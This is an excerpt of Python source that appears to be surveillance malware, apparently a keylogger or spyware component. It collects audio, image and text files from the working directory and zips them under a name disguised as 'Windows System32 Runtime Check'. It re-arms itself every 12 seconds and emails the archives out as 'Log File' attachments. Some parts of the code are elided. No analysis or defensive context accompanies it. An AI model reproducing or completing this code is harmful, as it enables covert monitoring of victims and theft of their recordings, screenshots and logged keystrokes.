...
def get_media_file_paths():
    media_file_path_list = []
    files = os.listdir(current_working_dir)

    for f in files:
        if f.endswith('.wav'):
            media_file_path_list.append(f)
        if f.endswith('.png'):
            media_file_path_list.append(f)
        if f.endswith('.txt'):
            media_file_path_list.append(f)
...
def main_zip():
    global zip_counter
    date_time = datetime.today().strftime('%d-%m-%Y %H~%M~%S ')
    name = 'Windows System32 Runtime Check ' + str(zip_counter) + " " + date_time + '.zip'
    ...
    print('All files zipped successfully!' + str(zip_counter))
    Timer(12, main_zip).start()
...
def send_email(filename, attachment, toaddr):
    ...
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File " + str(date_time)
